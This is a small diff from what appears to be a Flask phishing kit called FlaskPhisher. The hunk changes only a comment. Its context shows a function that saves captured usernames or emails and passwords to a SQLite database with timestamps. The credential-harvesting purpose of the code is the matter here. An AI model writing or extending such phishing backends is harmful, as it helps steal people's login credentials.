@@ -48,7 +48,7 @@ def saveData(username,password):
     db = "./db/FlaskPhisher.db"
     connection = sqlite3.connect(db)
     cursor = connection.cursor()
-    # Database Configs End
+    # Database Configs
     date = datetime.datetime.now().strftime("%Y-%b-%d")
     time = datetime.datetime.now().strftime("%H:%M:%S:%p")
     sqlQuery = "INSERT INTO flaskphisher(usernam_or_email,password, cred_date, cred_time) VALUES(?,?,?,?)"
